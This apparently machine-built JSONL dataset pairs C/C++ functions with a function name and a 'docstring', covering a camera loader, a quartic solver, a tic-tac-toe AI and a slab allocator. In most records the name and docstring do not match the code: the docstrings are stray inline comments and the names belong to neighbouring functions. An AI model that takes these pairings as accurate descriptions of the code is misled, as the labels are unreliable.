{"content":"{'function_name': 'vpgl_load_rational_camera_from_txt_process_cons', 'docstring': '\/\/ label image', 'code': 'bool vpgl_load_rational_camera_from_txt_process(bprb_func_process& pro)\\n{\\n  if (pro.n_inputs()< 1) {\\n    std::cout << \"lvpgl_load_rational_camera_from_txt_process: The input number should be 1\" << std::endl;\\n    return false;\\n  }\\n\\n  \/\/ get the inputs\\n  std::string camera_filename = pro.get_input<std::string>(0);\\n\\n  vpgl_camera_double_sptr ratcam = read_rational_camera_from_txt<double>(camera_filename);\\n\\n  if ( !ratcam.as_pointer() ) {\\n    std::cerr << \"Failed to load rational camera from file\" << camera_filename << std::endl;\\n    return false;\\n  }\\n\\n  pro.set_output_val<vpgl_camera_double_sptr>(0, ratcam);\\n\\n  return true;\\n}'}","id":204}
{"content":"{'function_name': 'strip_chart_win1_canvas1_event_callback', 'docstring': '\/* gxv_end_connections *\/', 'code': 'Notify_value\\nwin1_event_proc( Xv_window  win, Event *event,\\n\\t\\t Notify_arg arg, Notify_event_type type)\\n{\\n\\n  xv_get(win, XV_KEY_DATA, INSTANCE);\\n  \\n  switch(event_action(event)) {\\n\\n  case WIN_RESIZE:\\n\\n    \/\/ Release backing Pixmap\\n\\n    if(gd.back_xid) XFreePixmap(gd.dpy,gd.back_xid);\\n    \\n    \/\/ recompute sizes\\n\\n    gd.win_height =  xv_get(gd.Strip_chart_win1->win1,WIN_HEIGHT);\\n    gd.win_width =  xv_get(gd.Strip_chart_win1->win1,WIN_WIDTH);\\n    gd.plot_height = gd.win_height - gd.p->bottom_margin;\\n    gd.plot_width = gd.win_width -  gd.p->right_margin;\\n\\n    \/\/ force a recalc on the times, and a retrieve\\n\\n    check_retrieve(true);\\n    \\n    if (gd.p->debug) {\\n      cerr << \"Resizing window\" << endl;\\n      cerr << \"  pixels_per_sec: \" << gd.pixels_per_sec << endl;\\n      cerr << \"  win_height: \" << gd.win_height << endl;\\n      cerr << \"  win_width: \" << gd.win_width << endl;\\n      cerr << \"  plot_height: \" << gd.plot_height << endl;\\n      cerr << \"  plot_width: \" << gd.plot_width << endl;\\n      cerr << \"  Start time: \" << utimstr(gd.start_time) << endl;\\n      cerr << \"  End   time: \" << utimstr(gd.end_time) << endl;\\n    }\\n\\n    \/\/ create new backing Pixmap\\n\\n    gd.back_xid =  XCreatePixmap(gd.dpy, gd.canvas_xid,\\n\\t\\t\\t\\t gd.win_width, gd.win_height,\\n\\t\\t\\t\\t DefaultDepth(gd.dpy,0));\\n\\n    do_draw();\\n\\n    break;\\n\\n  default: {}\\n\\n  }\\n  \\n  \\n  \/* gxv_start_connections DO NOT EDIT THIS SECTION *\/\\n  \\n  \/* gxv_end_connections *\/\\n  \\n  return notify_next_event_func(win, (Notify_event) event, arg, type);\\n\\n}'}","id":205}
{"content":"{'function_name': 'get_default_charset', 'docstring': '\/\/ We are defaulting everything to Latin1 except JSON which is utf-8.', 'code': 'static endian_ness check_byte_order_mark(const utf16string &str)\\n    {\\n        if(str.empty())\\n        {\\n            return unknown;\\n        }\\n        const unsigned char *src = (const unsigned char *)&str[0];\\n        \\n        \/\/ little endian\\n        if(src[0] == 0xFF && src[1] == 0xFE)\\n        {\\n            return little_endian;\\n        }\\n\\n        \/\/ big endian\\n        else if(src[0] == 0xFE && src[1] == 0xFF)\\n        {\\n            return big_endian;\\n        }\\n\\n        return unknown;\\n    }'}","id":209}
{"content":"{'function_name': 'appd_iot_json_add_key_value', 'docstring': '\/\/add comma at the end if last operation is not start', 'code': 'appd_iot_error_code_t appd_iot_json_add_string_key_value\\n(json_t* json, const char* key, const char* strval)\\n{\\n  \/\/do escape, get the size\\n  return appd_iot_json_add_key_value(json, key, (void*)strval, APPD_IOT_STRING);\\n}'}","id":210}
{"content":"{'function_name': 'lua_ref_create_module', 'docstring': '\/\/ \u8ba9\u5185\u5b58\u5757\u6307\u5411\u4e00\u4e2aRef\u5bf9\u8c61', 'code': 'int lua_ref_retain_module(lua_State *L)\\n{\\n    \/\/ \u4ece\u6808\u5e95\u8fd4\u56de\u5bf9\u8c61\\n    Ref **obj = (Ref **)lua_touserdata(L, 1);\\n    luaL_argcheck(L, obj != NULL, 1, \"invalid user data\");\\n    int argc = lua_gettop(L) - 1;\\n    if (argc == 0)\\n    {\\n        (*obj)->retain();\\n        return 1;\\n    }\\n    else\\n    {\\n        std::cout << \"argc should\" << argc << endl;\\n        return 0;\\n    }\\n}'}","id":218}
{"content":"{'function_name': 'ParseFileParallel', 'docstring': '\/\/ wait for parsing to finish', 'code': 'inline Result ParseFile(const std::filesystem::path& filepath, const MaterialLibrary& mtllib)\\n{\\n    if (filepath.empty()) {\\n        auto error = std::make_error_code(std::errc::invalid_argument);\\n        return Result{ Attributes{}, Shapes{}, Materials{}, Error{ error } };\\n    }\\n\\n    auto file = sys::File(filepath);\\n\\n    if (!file) {\\n        return Result{ Attributes{}, Shapes{}, Materials{}, Error{ file.error() } };\\n    }\\n\\n    auto context = std::make_shared<SharedContext>();\\n\\n    context->material.library = std::holds_alternative<std::monostate>(mtllib.Value()) ? nullptr : &mtllib;\\n\\n    if (std::holds_alternative<std::vector<std::filesystem::path>>(mtllib.Value())) {\\n        context->material.basepath = filepath.parent_path();\\n    }\\n\\n    auto chunks = std::vector<Chunk>();\\n\\n    auto t1 = std::chrono::steady_clock::now();\\n\\n    if (file.size() <= kSingleThreadCutoff) {\\n        ParseFileSequential(&file, &chunks, context);\\n    } else {\\n        ParseFileParallel(&file, &chunks, context);\\n    }\\n\\n    auto t2 = std::chrono::steady_clock::now();\\n\\n    context->debug.parse.total_time = t2 - t1;\\n\\n    \/\/ check if an error occured\\n    size_t running_line_num = size_t{};\\n    for (auto& chunk : chunks) {\\n        if (chunk.error.code) {\\n            chunk.error.line_num += running_line_num;\\n            return Result{ Attributes{}, Shapes{}, Materials{}, chunk.error };\\n        }\\n        running_line_num += chunk.text.line_count;\\n    }\\n\\n    t1 = std::chrono::steady_clock::now();\\n\\n    auto result = Merge(chunks, context);\\n\\n    t2 = std::chrono::steady_clock::now();\\n\\n    context->debug.merge.total_time = t2 - t1;\\n\\n    \/\/ std::cout << DumpDebug(file, *context);\\n\\n    auto memory = size_t{ 0 };\\n\\n    for (const auto& chunk : chunks) {\\n        memory += SizeInBytes(chunk);\\n    }\\n\\n    \/\/ Free memory in a different thread\\n    if (memory > kMemoryRecyclingSize) {\\n        auto recycle = std::thread([](std::vector<Chunk>&&) {}, std::move(chunks));\\n        recycle.detach();\\n    }\\n\\n    return result;\\n}'}","id":222}
{"content":"{'function_name': 'p_GeoDaWeight__GetNumObs', 'docstring': '\/\/ invoke the function', 'code': 'bool p_GeoDaWeight__IsSymmetric(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  bool is_sym = ptr->IsSymmetric();\\n\\n  return is_sym;\\n}'}","id":223}
{"content":"{'function_name': 'main_identifier', 'docstring': '\/\/\u65e0\u9650\u5b9a\u6807\u8bc6\u7b26\uff0c\u6709\u9650\u5b9a\u6807\u8bc6\u7b26\uff0c\u540d\u5b57\uff0c\u8bf7\u770b\u672c\u4eba\u7b80\u4e66\uff0c\u7eea\u8bba\u3002', 'code': 'bool main_expression() {\\n    C1 Ca,*Cb = new C1();\\n    int C1::*p_member = &C1::member;\\n    \/\/\u8868\u8fbe\u5f0f\u7684\u6982\u5ff5\uff0c\u5728\u672c\u4eba\u7b80\u4e66\u5185\u6709\u53d9\u8ff0\uff0c\u6b64\u5904\u4e0d\u518d\u505a\u9648\u8ff0\u3002\\n    \/\/\u521d\u7b49\u8868\u8fbe\u5f0f\uff1a                                    \/\/\u521d\u7b49\u8868\u8fbe\u5f0f\u5b58\u5728\u5728\u8868\u8fbe\u5f0f\u5d4c\u5957\u4e2d\uff0c\u4f5c\u4e3a\u8868\u8fbe\u5f0f\u6c42\u503c\u7684\u57fa\u672c\u5355\u4f4d\\n    int j;\\n    1;                                              \/\/\u5b57\u9762\u91cf\\n    j;                                              \/\/\u5bf9\u4e00\u4e2a\u5b9e\u4f53\u547d\u540d\u7684\u540d\u5b57\\n    [](){};                                         \/\/lanbda\u8868\u8fbe\u5f0f\\n    fun(1,2,3,4,5,6);                               \/\/\u4f7f\u7528\u4e86\u6298\u53e0\u8868\u8fbe\u5f0f\u8fd4\u56de\uff0c\u8fd9\u91cc\u7684\u6298\u53e0\u8868\u8fbe\u5f0f\u662f\u521d\u5b9a\u8868\u8fbe\u5f0f\\n    (1+2+3);                                        \/\/\u62ec\u53f7\u5185\u7684\u8868\u8fbe\u5f0f\uff0c\u6574\u4e2a\u62ec\u53f7\u5f53\u4f5c\u4e00\u4e2a\u521d\u7b49\u8868\u8fbe\u5f0f\\n                                                    \/\/\u89e3\u91ca\uff1a\u4e3a\u4ec0\u4e48\u62ec\u53f7\u4f18\u5148\u8ba1\u7b97\\n                                                    \/\/\u56e0\u4e3a\u4e00\u4e2a\u8868\u8fbe\u5f0f\u901a\u5e38\u90fd\u662f\u7531\u8fd0\u7b97\u6570\u548c\u8fd0\u7b97\u7b26\u7ec4\u6210\\n                                                    \/\/\u8868\u8fbe\u5f0f\u53ef\u4ee5\u662f\u4e00\u5806\u521d\u7b49\u8868\u8fbe\u5f0f\u5d4c\u5957\uff0c\u4e4b\u540e\u987a\u5e8f\u6267\u884c\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u6bcf\u4e2a\u521d\u7b49\u8868\u8fbe\u5f0f\u7684\u503c\u5373\u53ef\\n                                                    \/\/\u56e0\u6b64\uff0c\u62ec\u53f7\u5185\u7684\u503c\u56de\u5728\u6240\u7ed3\u5408\u7684\u8fd0\u7b97\u7b26\u8fdb\u884c\u8868\u8fbe\u5f0f\u6c42\u503c\u4e4b\u524d\u88ab\u6c42\u503c\\n    \/\/\u4e0d\u6c42\u503c\u8868\u8fbe\u5f0f\uff1a\\n    sizeof(std::cout<<1);\\n    decltype(std::cout<<2);\\n    typeid(j += 4);\\n    \/\/\u4ee5\u53canoexpect\u548c\u6c42\u5305\u5927\u5c0f\u7684sizeof\\n                                                    \/\/\u4e0d\u6c42\u503c\u8868\u8fbe\u5f0f\u7684\u610f\u4e49\u5c31\u5728\u4e8e\uff0c\u5728\u7f16\u8bd1\u671f\u83b7\u5f97\u4e00\u4e2a\u6570\u636e\uff0c\u5e76\u4e0d\u5728\u8fd0\u884c\u65f6\u5bf9\u8fd0\u7b97\u6570\u6c42\u503c\uff0c\u4ee5\u4e0a\u7684\u8868\u8fbe\u5f0f\u90fd\u662f\u8fd0\u7b97\u7b26\\n                                                    \/\/\u7279\u4f8b\uff0ctypeid\u5728\u5b58\u5bf9\u5b58\u5728\u591a\u6001\u7684\u5bf9\u884c\u6c42\u7c7b\u578b\u65f6\uff0c\u56de\u6c42\u52a8\u6001\u7c7b\u578b\uff0c\u6b64\u65f6\u4f1a\u5bf9\u8868\u8fbe\u5f0f\u6c42\u503c\\n    \/\/\u5f03\u503c\u8868\u8fbe\u5f0f\\n    \/\/\u6982\u5ff5\uff0c\u5f03\u503c\u8868\u8fbe\u5f0f\u5b9e\u9645\u4e0a\u5c31\u662f\u8868\u660e\uff0c\u5f53\u524d\u8868\u8fbe\u5f0f\u7684\u503c\u4e0d\u88ab\u8fd0\u7b97\u7b26\u6240\u9700\u8981\u800c\u88ab\u4e22\u5f03\\n    j;                                              \/\/\u4e00\u4e2a\u5927\u7684\u8868\u8fbe\u5f0f\uff0c\u5355\u72ec\u7531\u4e00\u4e2a\u6807\u8bc6\u7b26\u7684\\n    Ca.member;\\n    Cb->member;\\n    Ca.*p_member;\\n    Cb->*p_member;                                  \/\/\u5bf9\u4e8e\u8fd9\u4e00\u7c7b\u7684\u6210\u5458\u8bbf\u95ee\u8868\u8fbe\u5f0f\\n    j == 2?1:2;                                     \/\/\u6761\u4ef6\u8868\u8fbe\u5f0f\\n    1,2,3,4;                                        \/\/\u9017\u53f7\u8868\u8fbe\u5f0f\\n    \/\/\u8868\u8fbe\u5f0f\u8bed\u53e5                                      \/\/\u8868\u8fbe\u5f0f\u8bed\u53e5\uff0c\u5373\u6240\u6709\u4ee5;\u7ed3\u5c3e\u7684\u8868\u8fbe\u5f0f\uff0c\u662fC++\u987a\u5e8f\u6267\u884c\u7684\u7a0b\u5e8f\u7247\u6bb5\\n    \/\/\u5e38\u91cf\u8868\u8fbe\u5f0f\uff0c\u5728\u7b80\u4e66\u4e2d\u63cf\u8ff0\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002\\n    return true;\\n}'}","id":224}
{"content":"{'function_name': 'pythia_higgs_events_generator', 'docstring': '\/\/ How many events you want to see ', 'code': 'int main() \\n{\\n    Int_t simulated_events = 10000; \/\/ each event is understood as a pp colition\\n\\n    pythia_higgs_events_generator(simulated_events);\\n\\n    return 0;\\n}'}","id":246}
{"content":"{'function_name': 'sol3', 'docstring': '\/\/ct1=ccbrt(0.5*(-q+cx));', 'code': 'int sol4(double xa[5], double xz[4]) {\\n    double p, q, r;\\n    double b[4], cb[4], cz[3];\\n    std::complex<double> p3, q3;\\n\\n    if(xa[4]*xa[4]<= ALM0*ALM0) return sol3(xa,xz);\\n\\n\\n    b[0] = xa[0] \/ xa[4];\\n    b[1] = xa[1] \/ xa[4];\\n    b[2] = xa[2] \/ xa[4];\\n    b[3] = xa[3] \/ xa[4];\\n\\n    if ((b[1]*b[1]) <= ALM0*ALM0 && (b[3]*b[3]) <= ALM0*ALM0) {\\n\\n        cb[0] = b[0];\\n        cb[1] = b[2];\\n        cb[2] = 1.0;\\n        if ( sol2(cb, cz) == 0) return 0;\\n        int cnt = 0;\\n        if (cz[0] >= 0) {\\n            xz[cnt++] = sqrt(cz[0]);\\n            xz[cnt++] = -sqrt(cz[0]);\\n        }\\n        if (cz[1] >= 0) {\\n            xz[cnt++] = sqrt(cz[1]);\\n            xz[cnt++] = -sqrt(cz[1]);\\n        }\\n        return cnt;\\n    }\\n\\n\\n    p = -3.0 * b[3] * b[3] \/ 8.0 + b[2];\\n    q = 0.5 * b[3] * (0.25 * b[3] * b[3] - b[2]) + b[1];\\n    r = 0.25 * b[3] * (-b[1] + 0.25 * b[3] * (b[2] - 3.0 * b[3] * b[3] \/ 16.0)) + b[0];\\n\\n    cb[0] = -q * q \/ 64;\\n    cb[1] = (p * p - 4 * r) \/ 16;\\n    cb[2] = 0.5 * p;\\n    cb[3] = 1.0;\\n    int n = sol3(cb, cz);\\n\\n\\n    complex<double> sqt, ez[4];\\n    double err[3];\\n\/\/    int si=0;\\n    double terr = 1e10;\\n    int tcnt = 0;\\n    double ezr[4];\\n\\n    for (int ei = 0;ei < n;ei++) {\\n        sqt = sqrt(cz[ei]);\\n\/\/\\tcout << \"test3\" << tcnt<<endl;\\n\\n        if (norm(sqt) >= ALM0*ALM0) {\\n            p3 = sqrt(-sqt * sqt - 0.5 * p - 0.25 * q \/ sqt);\\n            q3 = sqrt(-sqt * sqt - 0.5 * p + 0.25 * q \/ sqt);\\n\\n            ez[0] = sqt + p3 - 0.25 * b[3];\\n            ez[1] = sqt - p3 - 0.25 * b[3];\\n            ez[2] = -sqt + q3 - 0.25 * b[3];\\n            ez[3] = -sqt - q3 - 0.25 * b[3];\\n        } else ez[0] = ez[1] = ez[2] = ez[3] = -0.25 * b[3];\\n        int cnt = 0;\\n\\n        for (int i = 0;i < 4;i++) {\\n\/\/\\t\\t\\tcout << i << \" \" << real (ez[i] ) << \" \" << imag (ez[i]) << endl;\\n            if (fabs((ez[i]).imag()) > ALM0) continue;\\n            ezr[cnt++] = ez[i].real();\\n        }\\n        if(cnt == 0 ) continue;\\n\\n        if ((b[3]*b[3]) >= ALM0*ALM0) {\\n            err[ei] = 0;\\n            for (int i = 0;i < cnt;i++) {\\n                err[ei] += std::pow(cpoly4(xa, ezr[i]), 2);\\n            }\\n        }\\n\\n        if (terr >= err[ei]) {\\n            xz[0] = ezr[0];\\n            xz[1] = ezr[1];\\n            xz[2] = ezr[2];\\n            xz[3] = ezr[3];\\n            tcnt = cnt;\\n            terr = err[ei];\\n        }\\n    }\\n\/\/\\tcout << terr << endl;\\n    return tcnt;\\n}'}","id":253}
{"content":"{'function_name': 'PyButtonWidget', 'docstring': '\/\/ If making a new widget add it at the end.', 'code': 'static auto PyCheckBoxWidget(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n  PyObject* size_obj = Py_None;\\n  PyObject* pos_obj = Py_None;\\n  PyObject* text_obj = Py_None;\\n  PyObject* value_obj = Py_None;\\n  PyObject* on_value_change_call_obj = Py_None;\\n  PyObject* on_select_call_obj = Py_None;\\n  PyObject* scale_obj = Py_None;\\n  PyObject* is_radio_button_obj = Py_None;\\n  PyObject* maxwidth_obj = Py_None;\\n  PyObject* parent_obj = Py_None;\\n  PyObject* edit_obj = Py_None;\\n  ContainerWidget* parent_widget = nullptr;\\n  PyObject* text_scale_obj = Py_None;\\n  PyObject* textcolor_obj = Py_None;\\n  PyObject* autoselect_obj = Py_None;\\n  PyObject* color_obj = Py_None;\\n\\n  static const char* kwlist[] = {\"edit\",\\n                                 \"parent\",\\n                                 \"size\",\\n                                 \"position\",\\n                                 \"text\",\\n                                 \"value\",\\n                                 \"on_value_change_call\",\\n                                 \"on_select_call\",\\n                                 \"text_scale\",\\n                                 \"textcolor\",\\n                                 \"scale\",\\n                                 \"is_radio_button\",\\n                                 \"maxwidth\",\\n                                 \"autoselect\",\\n                                 \"color\",\\n                                 nullptr};\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"|OOOOOOOOOOOOOOO\", const_cast<char**>(kwlist),\\n          &edit_obj, &parent_obj, &size_obj, &pos_obj, &text_obj, &value_obj,\\n          &on_value_change_call_obj, &on_select_call_obj, &text_scale_obj,\\n          &textcolor_obj, &scale_obj, &is_radio_button_obj, &maxwidth_obj,\\n          &autoselect_obj, &color_obj)) {\\n    return nullptr;\\n  }\\n\\n  if (!g_base->CurrentContext().IsEmpty()) {\\n    throw Exception(\"UI functions must be called with no context set.\");\\n  }\\n\\n  \/\/ Grab the edited widget or create a new one.\\n  Object::Ref<CheckBoxWidget> widget;\\n  if (edit_obj != Py_None) {\\n    widget = dynamic_cast<CheckBoxWidget*>(UIV1Python::GetPyWidget(edit_obj));\\n    if (!widget.Exists()) {\\n      throw Exception(\"Invalid or nonexistent widget.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n  } else {\\n    parent_widget = parent_obj == Py_None\\n                        ? g_ui_v1->screen_root_widget()\\n                        : dynamic_cast<ContainerWidget*>(\\n                            UIV1Python::GetPyWidget(parent_obj));\\n    if (parent_widget == nullptr) {\\n      throw Exception(\"Parent widget nonexistent or not a container.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n    widget = Object::New<CheckBoxWidget>();\\n  }\\n\\n  \/\/ set applicable values ----------------------------\\n  if (size_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(size_obj);\\n    widget->SetWidth(p.x);\\n    widget->SetHeight(p.y);\\n  }\\n  if (pos_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(pos_obj);\\n    widget->set_translate(p.x, p.y);\\n  }\\n  if (autoselect_obj != Py_None) {\\n    widget->set_auto_select(Python::GetPyBool(autoselect_obj));\\n  }\\n  if (text_obj != Py_None) {\\n    widget->SetText(g_base->python->GetPyLString(text_obj));\\n  }\\n  if (value_obj != Py_None) {\\n    widget->SetValue(Python::GetPyBool(value_obj));\\n  }\\n  if (color_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(color_obj);\\n    if (c.size() != 3)\\n      throw Exception(\"Expected 3 floats for color.\", PyExcType::kValue);\\n    widget->set_color(c[0], c[1], c[2]);\\n  }\\n  if (maxwidth_obj != Py_None) {\\n    widget->SetMaxWidth(Python::GetPyFloat(maxwidth_obj));\\n  }\\n  if (is_radio_button_obj != Py_None) {\\n    widget->SetIsRadioButton(Python::GetPyBool(is_radio_button_obj));\\n  }\\n  if (scale_obj != Py_None) {\\n    widget->set_scale(Python::GetPyFloat(scale_obj));\\n  }\\n  if (on_value_change_call_obj != Py_None) {\\n    widget->SetOnValueChangeCall(on_value_change_call_obj);\\n  }\\n  if (on_select_call_obj != Py_None) {\\n    widget->SetOnSelectCall(on_select_call_obj);\\n  }\\n  if (text_scale_obj != Py_None) {\\n    widget->SetTextScale(Python::GetPyFloat(text_scale_obj));\\n  }\\n  if (textcolor_obj != Py_None) {\\n    std::vector<float> c = Python::GetPyFloats(textcolor_obj);\\n    if (c.size() != 3 && c.size() != 4) {\\n      throw Exception(\"Expected 3 or 4 float values for textcolor.\",\\n                      PyExcType::kValue);\\n    }\\n    if (c.size() == 3) {\\n      widget->set_text_color(c[0], c[1], c[2], 1.0f);\\n    } else {\\n      widget->set_text_color(c[0], c[1], c[2], c[3]);\\n    }\\n  }\\n\\n  \/\/ if making a new widget add it at the end\\n  if (edit_obj == Py_None) {\\n    g_ui_v1->AddWidget(widget.Get(), parent_widget);\\n  }\\n\\n  return widget->NewPyRef();\\n\\n  BA_PYTHON_CATCH;\\n}'}","id":256}
{"content":"{'function_name': 'checkState', 'docstring': '\/\/ checks every possible win state for X and O', 'code': 'int chooseSpace(std::array<state, 9> b, int m) { \/\/ returns best space for the AI to play - tries to block player \\n    \/\/ tries to win\\n    if (b[4] == empty) {\\n        return 4;\\n    } else if (b[5] == X && b[7] == X && b[8] == empty) {\\n        return 8;\\n    } else if (m == 1) {\\n        if (b[4] == X) {\\n            return 0;\\n        }\\n    } else if (b[0] == O && b[1] == O && b[2] == empty) {\\n        return 2;\\n    } else if (b[1] == O && b[2] == O && b[0] == empty) {\\n        return 0;\\n    } else if (b[0] == O && b[2] == O && b[1] == empty) {\\n        return 1;\\n    } else if (b[3] == O && b[4] == O && b[5] == empty) {\\n        return 5;\\n    } else if (b[4] == O && b[5] == O && b[3] == empty) {\\n        return 3;\\n    } else if (b[3] == O && b[5] == O && b[4] == empty) {\\n        return 4;\\n    } else if (b[6] == O && b[7] == O && b[8] == empty) {\\n        return 8;\\n    } else if (b[7] == O && b[8] == O && b[6] == empty) {\\n        return 6;\\n    } else if (b[6] == O && b[8] == O && b[7] == empty) {\\n        return 7;\\n    } else if (b[0] == O && b[3] == O && b[6] == empty) {\\n        return 6;\\n    } else if (b[3] == O && b[6] == O && b[0] == empty) {\\n        return 0;\\n    } else if (b[0] == O && b[6] == O && b[3] == empty) {\\n        return 3;\\n    } else if (b[1] == O && b[4] == O && b[7] == empty) {\\n        return 7;\\n    } else if (b[4] == O && b[7] == O && b[1] == empty) {\\n        return 1;\\n    } else if (b[1] == O && b[7] == O && b[4] == empty) {\\n        return 4;\\n    } else if (b[2] == O && b[5] == O && b[8] == empty) {\\n        return 8;\\n    } else if (b[5] == O && b[8] == O && b[2] == empty) {\\n        return 2;\\n    } else if (b[2] == O && b[8] == O && b[5] == empty) {\\n        return 5;\\n    } else if (b[0] == O && b[4] == O && b[8] == empty) {\\n        return 8;\\n    } else if (b[4] == O && b[8] == O && b[0] == empty) {\\n        return 0;\\n    } else if (b[0] == O && b[8] == O && b[4] == empty) {\\n        return 4;\\n    } else if (b[2] == O && b[4] == O && b[6] == empty) {\\n        return 6;\\n    } else if (b[4] == O && b[6] == O && b[2] == empty) {\\n        return 2;\\n    } else if (b[2] == O && b[6] == O && b[4] == empty) {\\n        return 4;\\n    }\\n\\n    \/\/ if cannot win, tries to block player\\n    if (b[4] == empty) {\\n        return 4;\\n    }\\n    if (b[0] == X && b[1] == X && b[2] == empty) {\\n        return 2;\\n    } else if (b[1] == X && b[2] == X && b[0] == empty) {\\n        return 0;\\n    } else if (b[0] == X && b[2] == X && b[1] == empty) {\\n        return 1;\\n    }\\n    if (b[3] == X && b[4] == X && b[5] == empty) {\\n        return 5;\\n    } else if (b[4] == X && b[5] == X && b[3] == empty) {\\n        return 3;\\n    } else if (b[3] == X && b[5] == X && b[4] == empty) {\\n        return 4;\\n    }\\n    if (b[6] == X && b[7] == X && b[8] == empty) {\\n        return 8;\\n    } else if (b[7] == X && b[8] == X && b[6] == empty) {\\n        return 6;\\n    } else if (b[6] == X && b[8] == X && b[7] == empty) {\\n        return 7;\\n    }\\n    if (b[0] == X && b[3] == X && b[6] == empty) {\\n        return 6;\\n    } else if (b[3] == X && b[6] == X && b[0] == empty) {\\n        return 0;\\n    } else if (b[0] == X && b[6] == X && b[3] == empty) {\\n        return 3;\\n    }\\n    if (b[1] == X && b[4] == X && b[7] == empty) {\\n        return 7;\\n    } else if (b[4] == X && b[7] == X && b[1] == empty) {\\n        return 1;\\n    } else if (b[1] == X && b[7] == X && b[4] == empty) {\\n        return 4;\\n    }\\n    if (b[2] == X && b[5] == X && b[8] == empty) {\\n        return 8;\\n    } else if (b[5] == X && b[8] == X && b[2] == empty) {\\n        return 2;\\n    } else if (b[2] == X && b[8] == X && b[5] == empty) {\\n        return 5;\\n    }\\n    if (b[0] == X && b[4] == X && b[8] == empty) {\\n        return 8;\\n    } else if (b[4] == X && b[8] == X && b[0] == empty) {\\n        return 0;\\n    } else if (b[0] == X && b[8] == X && b[4] == empty) {\\n        return 4;\\n    }\\n    if (b[2] == X && b[4] == X && b[6] == empty) {\\n        return 6;\\n    } else if (b[4] == X && b[6] == X && b[2] == empty) {\\n        return 2;\\n    } else if (b[2] == X && b[6] == X && b[4] == empty) {\\n        return 4;\\n    }\\n\\n    \/\/if cant win or block pick middle side (not corner)\\n    if (b[1] == empty && b[7] == empty) {\\n        return 1;\\n    } else if (b[3] == empty && b[5] == empty) {\\n        return 3;\\n    } else if (b[5] == empty && b[3] == empty) {\\n        return 5;\\n    } else if (b[7] == empty && b[1] == empty) {\\n        return 7;\\n    } else if (b[0] == empty) {\\n        return 0;\\n    } else if (b[2] == empty) {\\n        return 2;\\n    } else if (b[6] == empty) {\\n        return 6;\\n    } else if (b[8] == empty) {\\n        return 8;\\n    }\\n\\n    std::cout << \"error\";\\n    return 4;\\n}'}","id":258}
{"content":"{'function_name': 'CreateConvScaledInplace', 'docstring': '\/\/ Find the deltas tensor', 'code': 'StatusOr<poplar::program::Program> ConvBiasApply(CompilerResources& res,\\n                                                 const HloInstruction* inst,\\n                                                 const xla::Shape& output_shape,\\n                                                 TensorMap& tensor_map) {\\n  poplar::Graph& graph = GetGraph(res, inst);\\n\\n  poplar::program::Sequence prog;\\n\\n  const HloInstruction* root =\\n      inst->fused_instructions_computation()->root_instruction();\\n\\n  \/\/ Find the biases\\n  TF_ASSIGN_OR_RETURN(ArgVectors inputs,\\n                      FindInplaceOutputTensors(tensor_map, res, inst, prog));\\n  CHECK_EQ(inputs.size(), 1);\\n  CHECK_EQ(inputs[0].size(), 1);\\n  poplar::Tensor biases = inputs[0][0];\\n\\n  \/\/ Find the deltas\\n  TF_ASSIGN_OR_RETURN(poplar::Tensor deltas,\\n                      FindInstructionInput(tensor_map, res, inst, 1, prog));\\n\\n  \/\/ \/\/ Find reduction dimensions\\n  const auto* reduce = root->operand(1)->operand(0);\\n  std::vector<std::size_t> reduction_dims;\\n  for (auto d : reduce->dimensions()) {\\n    reduction_dims.push_back(d);\\n  }\\n\\n  TF_CHECK_OK(conv_graph_caching::DoCachedBiasApply(\\n      graph, res, biases, deltas, reduction_dims,\\n      GetSingleShardingDeviceId(inst), prog, inst, tensor_map));\\n\\n  TF_CHECK_OK(AddOutputTensor(tensor_map, inst, 0, biases));\\n\\n  return prog;\\n}'}","id":265}
{"content":"{'function_name': '__slab_remove', 'docstring': '\/\/ Not removed if only single element is present', 'code': 'inline void __slab_move_to_front(cache_t *cp, slab_t *slab)\\n{\\n    if (cp->slabs == slab)\\n    {\\n        return;\\n    }\\n\\n    __slab_remove(cp, slab);\\n\\n    \/\/ Empty list\\n    if (!cp->slabs)\\n    {\\n        slab->prev = slab;\\n        slab->next = slab;\\n        cp->slabs_back = slab;\\n    }\\n    \/\/ Append element to front\\n    else\\n    {\\n        slab->prev = cp->slabs;\\n        cp->slabs->next = slab;\\n        slab->next = cp->slabs_back;\\n        cp->slabs_back->prev = slab;\\n    }\\n\\n    cp->slabs = slab;\\n}'}","id":272}
{"content":"{'function_name': 'denoiseb_rd43_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd44_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd44 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: {  }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_0();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":275}
